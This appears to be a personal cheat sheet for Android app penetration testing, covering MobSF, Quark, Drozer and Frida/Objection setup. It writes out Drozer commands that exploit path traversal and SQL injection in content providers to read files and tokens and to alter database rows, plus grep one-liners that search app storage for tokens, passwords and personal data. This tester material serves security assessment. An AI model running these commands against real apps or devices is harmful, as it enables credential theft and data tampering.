# Android-Penetration-Testing-Automation

_________________________________________________________________________________________________________________________________________________

=>Tools for Android Penetration Testing Automation
1. MobSF (Mobile Security Framework) -	A comprehensive security testing framework that performs static and dynamic analysis on Android apps. Ideal for automated baseline testing.
2. Quark Engine	- Signature-based malware detection system that analyzes APK internals for suspicious behavior.
3. Drozer -	A framework for exploring an application's IPC attack surface. Requires an agent be installed on the device.
4. Objection -	A Frida-based runtime exploration toolkit. Capable of injecting hooks and inspecting app behavior without requiring access to source code.
5. Medusa	- A modular framework designed for automated dynamic analysis of mobile apps, with support for both Android and iOS.
_________________________________________________________________________________________________________________________________________________

**MobSF (Mobile Security Framework)**

1. Signer Certificate
The Signer Certificate section displays key details of the app's signing certificate, which include:
X.509 Subject: Identified as "CN=john doe".
Validity Period: Valid from May 12, 2023, until May 5, 2048.
Signature Algorithm: Uses the RSA algorithm (rsassa_pkcs1v15) with a key size of 2048 bits.
Issuer: Also "CN=john doe", indicating self-signing.
Hashes (SHA256, SHA1, MD5, SHA512): Various cryptographic hashes that help verify the certificate’s authenticity.

2. Android API
   APIs refer to the libraries (and the specific methods within those libraries) that are accessed by the application. These can be part of the Android operating system or third-party libraries included within the app. APIs enable various functionalities such as networking, cryptography, user interface customization, data storage, multimedia management, and more.
   Notable entries include 'HTTP Connection' and 'HTTPS Connection' for networking operations, with HTTP specifically categorized as insecure for server communication. We also see an entry for the Java Reflection API, which is often used by malicious actors to obfuscate method names when called.
_________________________________________________________________________________________________________________________________________________

**Quark**
Quark Engine, as stated in the official documentation, is "an open source software for automating analysis of suspicious Android application
Key Features of Quark Engine
1. Malware Scoring System	- Quark Engine assigns scores to detected behaviors based on severity and impact, providing a quantifiable measure of an app’s overall threat level.
2. Rule-Based Analysis	- The engine uses customizable JSON-based rules to detect known malicious patterns and behaviors, allowing users to update or extend detection logic.
3. Five Levels of Crime Investigation	- Quark Analyzes APKs across five distinct layers, each focusing on different behavioral aspects of the application.
4. Permission Analysis	Reviews - requested permissions to flag those that are excessive, suspicious, or indicative of malicious behavior.
5. API Calls and Tracking -	Tracks API calls, especially those accessing sensitive system resources or user data, to detect suspicious activity.
6. Dynamic Analysis -	Complements static analysis by observing app behavior at runtime, helping detect actions triggered only under specific conditions..
7. Graphical Reports	- Quark generates visual representations of behavior flows and interactions, simplifying the understanding of complex threat patterns.
8. Classifying Crime Rules - quark -s -a myapp.apk -r quark-rules -t 100 -c
9. Web Report - quark -s -a myapp.apk -r quark-rules -t 100 -w report
10. 

**Installation & Usage**
1. python3 -m venv quark
2. source quark/bin/activate
3. pip3 install -U quark-engine
4. quark --version
5. Once the Quark Engine is installed, we will download the Quark Rules using the following commands:
6. git clone https://github.com/quark-engine/quark-rules
7.  ls -l quark-rules/rules
8.  quark -s -a myapp.apk -r quark-rules
      -s is used to show the summary report, while the options -a and -r specify the APK file and set of rules accordingly

 OR install in kali
 1. sudo apt install quark-engine
 2.  git clone https://github.com/quark-engine/quark-rules
 3.  mkdir -p /root/.quark-engine
 4.  cp -r /home/kali/Desktop/quark-rules /root/.quark-engine/quark-rules
 5.   quark -a myapp.apk -s -r /home/kali/Desktop/quark-rules/rules
 6.   chown -R $(whoami):$(whoami) /home/kali/Desktop/quark-rules (if needed for permission)
 7.   chmod -R u+rX /home/kali/Desktop/quark-rules (if needed for permission)
 8.   quark -s -a myapp.apk -r  /home/kali/Desktop/quark-rules/rules -t 100 -w report.html
 9.   quark -s -a myapp.apk -r  /home/kali/Desktop/quark-rules/rules -t 100 -w /home/kali/Desktop/report2
________________________________________________________________________________________________________________________________________________

**Drozer**
Drozer is a security testing framework that allows you to operate as if you're another Android application, enabling direct interaction with other apps, the operating system, and the device itself. This perspective closely mimics how a real, installed app would behave on the system, making it ideal for identifying inter-app communication vulnerabilities and misconfigurations.
(detective app for Android that pretends to be another app so it can check how that app and the phone behave)
(Drozer = a hired tester who dresses up as a normal app and walks around the phone asking, “Hey, can I use this?” If things answer “yes” when they shouldn’t, that’s a vulnerability.)

**Key Features**
**Feature**	              **Description**
Security Testing          : Framework	Drozer offers a robust framework with built-in modules that simulate various attack scenarios.
App Interaction	        :Enables interaction with Android's Inter-Process Communication (IPC) components such as content providers, broadcast receivers, and services. This allows testers to probe and exploit                              exposed components in other apps.
Command-line Interface	  :Operates via a powerful CLI, ideal for fast testing, automation, and integration into custom penetration testing workflows or scripts.
Module-based Architecture :Designed with extensibility in mind, Drozer supports writing custom modules in Python, enabling testers to create app-specific or system-specific security checks.


Commands:
1. adb devices -l
2. adb -s 28061JEGR08933 tcpip 5555 -> Tell device to listen on TCP 5555 (while USB plugged in)
3. adb -s 28061JEGR08933 shell ip -f inet addr show wlan0 -> Get device IP (if you already ran earlier and have 192.168.1.3, skip step 4 — otherwise run)
4. adb connect <ip>:<port> -> Connect ADB over Wi-Fi
5. adb -s <ip>:<port> forward tcp:31415 tcp:3141 -> Forward the Drozer port and connect the console
6. adb -s <ip>:<port> install -r myapp.apk -> Transerfering the apk
7. pipx install drozer -> install of drozer
8. on the device ont he drozer
9. run app.package.list -> list all the packages installed on the device
10. run app.package.list -f MyNoteBook -> We can also specify the filter MyNoteBook (the name of the app we want to assess) to find only the package name of the app we are interested in.
11. run app.package.info -a <package name> -> some general information about this app
12. run app.package.manifest <package name> -> read the manifest file for this application
13. run app.package.attacksurface <pakage name> -> components of the application are accessible to other apps
14. run scanner.provider.traversal -a <package name> ->  if there are any content providers vulnerable to Path Traversal attacks.
15. run app.provider.read <Vuerbale path from path traversal attack content://provide the url>/../../../system/etc/hosts -> use another module read the contents of the file /system/etc/hosts by exploiting the vulnerable content provider. ( ex. run app.provider.read content://com.hackthebox.myapp.fileprovider/../../../system/etc/hosts)
16. run scanner.provider.finduris -a <package name> -> explore the providers available URIs. (URLs accessible to other apps)
                                                       This module scans the target app for exported Content Providers and tries to discover any accessible URIs (like database paths).
18. run scanner.provider.injection -a <package name> -> to scan the app for content providers vulnerable to SQL injection
    Projection and Selection parameters. In this context, Projection defines which columns are returned in a query, while Selection corresponds to the WHERE clause used to filter rows
19. run scanner.provider.sqltables -a <package name> -> module that automatically exploits the identified injection points and tries to enumerate the database tables.
    run app.provider.query <paste the url with content:URL where sql is vulerbale> -> module to query the default table associated with this URI
20. jadx-gui myapp.apk -> check for code where the database is initialized (db).
21. run app.provider.query  --projection "<column1>, <column2>" -> exploit the SQL injection behavior to further read data
22. run app.provider.query <content://provider_uri> --projection "<column1>, <column2>, (SELECT token FROM Tokens)" -> select token fromm token needs to be changed when we see the db file
23. run app.provider.insert <content://provider_uri> --int <column1> 2 --string <column2> test ->  insert new entries into the database. number 2 and test
24. run app.provider.query <content://provider_uri> --projection "<column1>, <column2>" -> to check where new data has been added are not
25. run app.provider.update <content://provider_uri> --selection "<column1>=?" --selection-args 2 --string <column2> doe -> Update Existing Entries all data changes as per db or data is stored
26. run app.provider.delete <content://provider_uri> --selection "<column1>=?" --selection-args 2 -> Delete Existing Entry (delete the entry with _id = 2 )
27. 
_________________________________________________________________________________________________________________________________________________
Objection
1. help security testers dynamically assess Android and iOS applications without needing to recompile or root the device. It automates common tasks like bypassing jailbreak/root detection, dumping credentials, and hooking sensitive functions, making it ideal for real-time app manipulation and behavioral analysis.
2. runtime mobile instrumentation toolkit built on top of Frida
3. sudo pip3 install frida-tools --break-system-packages 
4. install in ANdroid device frida server, Be sure to select the version that matches the device's CPU architecture
5. adb shell getprop ro.product.cpu.abi - to get anndroid device CPU architecture
6. python3 -c "import frida; print(frida.__version__)" - to chek which version of frida u have in laptop/kali/OS
7. 
                                                      
_________________________________________________________________________________________________________________________________________________


**********Android Local Storage Command**********

Step 1 : adb shell
step 2 : cd /data/data/<binary-file>
Step 3: below command to find data
1. find . -type f -exec strings {} \; | grep -iE "Bearer|access_token|Authorization"  
2. find . -type f -exec grep -al "secret" {} \;
3. find . -type f -exec strings {} \; | grep "secret"
4. find . -type f -exec strings {} \; | grep -E "\b[6-9][0-9]{9}\b"
5. find . -type f -exec strings {} \; | grep "mobilenumber/name/anything"
6. find . -type f -exec grep -aiE "token|auth|bearer|access" {} \;
7.cd shared_prefs
  grep -aiE "token|auth|session" *
8. find . -type f -exec strings {} \; | grep -iE "authorization|token|apikey|password|bearer|session|jwt|secret"
9. find . -type f -exec strings {} \; | grep -E '[A-Za-z0-9+/=]{20,}' | grep -v '\.js'
10. find . -type f -exec strings {} \; | grep -iE 'name|address|gender|mobile|phone|email'
11. find . -type f -exec strings {} \; | grep -iE '(_updateSessionFromEvent|getSession|setSession|_session|session|sessions|onPanSessionStart|computeSecret|keyFromSecret|fromSecret|getSecret|PasswordBasedCipher|withXSRFToken|cancelToken|XSRF-TOKEN|X-XSRF-TOKEN|authorization|proxy-authorization|CancelToken)'
12. find . -type f -exec strings {} \; | grep -E 'eyJ[A-Za-z0-9_-]{10,}.*\.eyJ[A-Za-z0-9_-]{10,}\..*'


**********Android Command***************
1. jadx-gui myapp.apk
2. pip install objection==1.11.0 frida==16.7.19 frida-tools==13.7.1
   (THE LATEST ONE HAVE A ISSUE IN FRIDA SO  INSTALL THIS FOR STABLE ONE IN SYSTEM AND ANDROID frida-server-16.7.19-android-arm64, /data/local/tmp, chmod +x <file name>)
3. ps -A | grep frida (When we get frida sever alredy running after adb shell or running frida server)
   kill -9 10813 (to kill the server processor)

